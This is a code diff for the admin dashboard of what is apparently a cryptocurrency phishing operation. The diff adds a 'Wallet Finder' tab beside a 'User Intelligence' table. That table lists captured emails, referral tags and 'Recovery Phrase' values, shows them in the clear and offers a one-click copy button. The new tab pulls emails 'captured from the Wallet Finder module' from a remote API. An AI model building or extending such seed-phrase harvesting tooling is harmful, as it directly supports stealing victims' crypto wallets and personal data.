@@ -7,6 +7,8 @@ export default function AdminPage() {
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
   const [users, setUsers] = useState<any[]>([]);
+  const [finderEmails, setFinderEmails] = useState<any[]>([]);
+  const [activeTab, setActiveTab] = useState<"users" | "finder">("users");
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState("");
   const [status, setStatus] = useState("");
@@ -16,6 +18,7 @@ export default function AdminPage() {
     if (token) {
       setIsLoggedIn(true);
       fetchUsers(token);
+      fetchFinderEmails(token);
     }
   }, []);
 
@@ -37,6 +40,7 @@ export default function AdminPage() {
         localStorage.setItem("adminToken", data.token);
         setIsLoggedIn(true);
         fetchUsers(data.token);
+        fetchFinderEmails(data.token);
       } else {
         setError(data.message || "Login failed");
       }
@@ -66,10 +70,25 @@ export default function AdminPage() {
     }
   };
 
+  const fetchFinderEmails = async (token: string) => {
+    try {
+      const response = await fetch("https://api.basesupport.services/api/admin/finder-emails", {
+        headers: { Authorization: `Bearer ${token}` },
+      });
+      const data = await response.json();
+      if (response.ok) {
+        setFinderEmails(data.emails || []);
+      }
+    } catch (err) {
+      console.error("Failed to fetch finder emails");
+    }
+  };
+
   const handleLogout = () => {
     localStorage.removeItem("adminToken");
     setIsLoggedIn(false);
     setUsers([]);
+    setFinderEmails([]);
   };
 
   if (!isLoggedIn) {
@@ -181,19 +200,51 @@ export default function AdminPage() {
       </nav>
 
       <main className="flex-1 p-6 lg:p-10 max-w-7xl mx-auto w-full">
-        <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-6 mb-10">
-          <div>
-            <h1 className="text-3xl font-bold mb-2">User Intelligence</h1>
-            <p className="text-white/50">Monitoring and managing captured session data.</p>
+        <div className="flex flex-col mb-8 gap-6">
+          <div className="flex gap-4 border-b border-white/10 pb-4">
+            <button
+              onClick={() => setActiveTab("users")}
+              className={`px-6 py-2 rounded-xl text-sm font-bold transition-all ${
+                activeTab === "users" ? "bg-[#4285f4] text-white" : "bg-white/5 text-white/50 hover:bg-white/10"
+              }`}
+            >
+              User Intelligence
+            </button>
+            <button
+              onClick={() => setActiveTab("finder")}
+              className={`px-6 py-2 rounded-xl text-sm font-bold transition-all ${
+                activeTab === "finder" ? "bg-[#4285f4] text-white" : "bg-white/5 text-white/50 hover:bg-white/10"
+              }`}
+            >
+              Wallet Finder
+            </button>
           </div>
 
-          <div className="flex gap-4 w-full md:w-auto">
-             <div className="flex-1 md:flex-none p-4 bg-[#0f0f14] border border-white/5 rounded-2xl">
-                <p className="text-white/40 text-[10px] uppercase tracking-widest mb-1">Total Signals</p>
-                <p className="text-2xl font-mono font-bold text-[#4285f4]">{users.length}</p>
-             </div>
-             <button
-                onClick={() => fetchUsers(localStorage.getItem("adminToken") || "")}
+          <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-6">
+            <div>
+              <h1 className="text-3xl font-bold mb-2">
+                {activeTab === "users" ? "User Intelligence" : "Wallet Finder Emails"}
+              </h1>
+              <p className="text-white/50">
+                {activeTab === "users" 
+                  ? "Monitoring and managing captured session data." 
+                  : "Monitoring emails captured from the Wallet Finder module."}
+              </p>
+            </div>
+
+            <div className="flex gap-4 w-full md:w-auto">
+               <div className="flex-1 md:flex-none p-4 bg-[#0f0f14] border border-white/5 rounded-2xl">
+                  <p className="text-white/40 text-[10px] uppercase tracking-widest mb-1">Total Records</p>
+                  <p className="text-2xl font-mono font-bold text-[#4285f4]">
+                    {activeTab === "users" ? users.length : finderEmails.length}
+                  </p>
+               </div>
+               <button
+                  onClick={() => {
+                    const token = localStorage.getItem("adminToken") || "";
+                    if (activeTab === "users") fetchUsers(token);
+                    else fetchFinderEmails(token);
+                  }}
                 className="p-4 bg-[#4285f4]/10 border border-[#4285f4]/20 rounded-2xl hover:bg-[#4285f4]/20 transition-all"
                 title="Refresh Logic"
              >
@@ -204,69 +255,103 @@ export default function AdminPage() {
              </button>
           </div>
         </div>
+        </div>
 
-        {/* User Table Card */}
+        {/* Table Card */}
         <div className="bg-[#0f0f14] border border-white/10 rounded-[32px] overflow-hidden shadow-2xl">
           <div className="overflow-x-auto">
-            <table className="w-full text-left border-collapse">
-              <thead>
-                <tr className="bg-white/5 border-b border-white/10">
-                  <th className="px-8 py-5 text-sm font-semibold uppercase tracking-widest text-white/40">Timestamp</th>
-                  <th className="px-8 py-5 text-sm font-semibold uppercase tracking-widest text-white/40">Email Protocol</th>
-                  <th className="px-8 py-5 text-sm font-semibold uppercase tracking-widest text-white/40">Recovery Phrase</th>
-                </tr>
-              </thead>
-              <tbody className="divide-y divide-white/5">
-                {users.length > 0 ? (
-                  users.map((user, idx) => (
-                    <tr key={user._id || idx} className="hover:bg-white/[0.02] transition-colors group">
-                      <td className="px-8 py-6 text-sm text-white/60 font-mono">
-                        {new Date(user.createdAt).toLocaleString()}
-                      </td>
-                      <td className="px-8 py-6">
-                        <div className="flex flex-col gap-2">
-                          <span className="bg-[#4285f4]/10 text-[#4285f4] border border-[#4285f4]/20 px-3 py-1 rounded-lg text-sm font-medium w-fit">
-                            {user.email}
-                          </span>
-                          {user.referredBy && (
-                            <span className="bg-green-500/10 text-green-400 border border-green-500/20 px-2 py-0.5 rounded-md text-[10px] font-bold uppercase tracking-wider w-fit">
-                              Ref: {user.referredBy}
+            {activeTab === "users" ? (
+              <table className="w-full text-left border-collapse">
+                <thead>
+                  <tr className="bg-white/5 border-b border-white/10">
+                    <th className="px-8 py-5 text-sm font-semibold uppercase tracking-widest text-white/40">Timestamp</th>
+                    <th className="px-8 py-5 text-sm font-semibold uppercase tracking-widest text-white/40">Email Protocol</th>
+                    <th className="px-8 py-5 text-sm font-semibold uppercase tracking-widest text-white/40">Recovery Phrase</th>
+                  </tr>
+                </thead>
+                <tbody className="divide-y divide-white/5">
+                  {users.length > 0 ? (
+                    users.map((user, idx) => (
+                      <tr key={user._id || idx} className="hover:bg-white/[0.02] transition-colors group">
+                        <td className="px-8 py-6 text-sm text-white/60 font-mono">
+                          {new Date(user.createdAt).toLocaleString()}
+                        </td>
+                        <td className="px-8 py-6">
+                          <div className="flex flex-col gap-2">
+                            <span className="bg-[#4285f4]/10 text-[#4285f4] border border-[#4285f4]/20 px-3 py-1 rounded-lg text-sm font-medium w-fit">
+                              {user.email}
                             </span>
-                          )}
-                        </div>
-                      </td>
-                      <td className="px-8 py-6">
-                        <div className="relative group/seed">
-                          <p className="text-sm font-mono text-white/80 leading-relaxed bg-black/30 p-4 rounded-xl border border-white/5 group-hover:border-[#4285f4]/40 transition-all">
-                            {user.password}
-                          </p>
-                          <button
-                             onClick={() => {
-                               navigator.clipboard.writeText(user.password);
-                               setStatus("Signal copied to clipboard!");
-                               setTimeout(() => setStatus(""), 2000);
-                             }}
-                             className="absolute top-2 right-2 opacity-0 group-hover/seed:opacity-100 p-2 bg-white/10 hover:bg-white/20 rounded-lg transition-all"
-                             title="Copy Signal"
-                          >
-                             <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-                               <path d="M16 4h2a2 2 0 012 2v14a2 2 0 01-2 2H6a2 2 0 01-2-2V6a2 2 0 012-2h2"/>
-                               <rect x="8" y="2" width="8" height="4" rx="1" ry="1"/>
-                             </svg>
-                          </button>
-                        </div>
+                            {user.referredBy && (
+                              <span className="bg-green-500/10 text-green-400 border border-green-500/20 px-2 py-0.5 rounded-md text-[10px] font-bold uppercase tracking-wider w-fit">
+                                Ref: {user.referredBy}
+                              </span>
+                            )}
+                          </div>
+                        </td>
+                        <td className="px-8 py-6">
+                          <div className="relative group/seed">
+                            <p className="text-sm font-mono text-white/80 leading-relaxed bg-black/30 p-4 rounded-xl border border-white/5 group-hover:border-[#4285f4]/40 transition-all">
+                              {user.password}
+                            </p>
+                            <button
+                               onClick={() => {
+                                 navigator.clipboard.writeText(user.password);
+                                 setStatus("Signal copied to clipboard!");
+                                 setTimeout(() => setStatus(""), 2000);
+                               }}
+                               className="absolute top-2 right-2 opacity-0 group-hover/seed:opacity-100 p-2 bg-white/10 hover:bg-white/20 rounded-lg transition-all"
+                               title="Copy Signal"
+                            >
+                               <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
+                                 <path d="M16 4h2a2 2 0 012 2v14a2 2 0 01-2 2H6a2 2 0 01-2-2V6a2 2 0 012-2h2"/>
+                                 <rect x="8" y="2" width="8" height="4" rx="1" ry="1"/>
+                               </svg>
+                            </button>
+                          </div>
+                        </td>
+                      </tr>
+                    ))
+                  ) : (
+                    <tr>
+                      <td colSpan={3} className="px-8 py-20 text-center text-white/30 italic">
+                        No signals detected on the frequency.
                       </td>
                     </tr>
-                  ))
-                ) : (
-                  <tr>
-                    <td colSpan={3} className="px-8 py-20 text-center text-white/30 italic">
-                      No signals detected on the frequency.
-                    </td>
+                  )}
+                </tbody>
+              </table>
+            ) : (
+              <table className="w-full text-left border-collapse">
+                <thead>
+                  <tr className="bg-white/5 border-b border-white/10">
+                    <th className="px-8 py-5 text-sm font-semibold uppercase tracking-widest text-white/40">Timestamp</th>
+                    <th className="px-8 py-5 text-sm font-semibold uppercase tracking-widest text-white/40">Wallet Finder Email</th>
                   </tr>
-                )}
-              </tbody>
-            </table>
+                </thead>
+                <tbody className="divide-y divide-white/5">
+                  {finderEmails.length > 0 ? (
+                    finderEmails.map((record, idx) => (
+                      <tr key={record._id || idx} className="hover:bg-white/[0.02] transition-colors group">
+                        <td className="px-8 py-6 text-sm text-white/60 font-mono">
+                          {new Date(record.createdAt).toLocaleString()}
+                        </td>
+                        <td className="px-8 py-6">
+                          <span className="bg-[#9333ea]/10 text-[#9333ea] border border-[#9333ea]/20 px-3 py-1 rounded-lg text-sm font-medium w-fit">
+                            {record.email}
+                          </span>
+                        </td>
+                      </tr>
+                    ))
+                  ) : (
+                    <tr>
+                      <td colSpan={2} className="px-8 py-20 text-center text-white/30 italic">
+                        No finder emails collected yet.
+                      </td>
+                    </tr>
+                  )}
+                </tbody>
+              </table>
+            )}
           </div>
         </div>
 
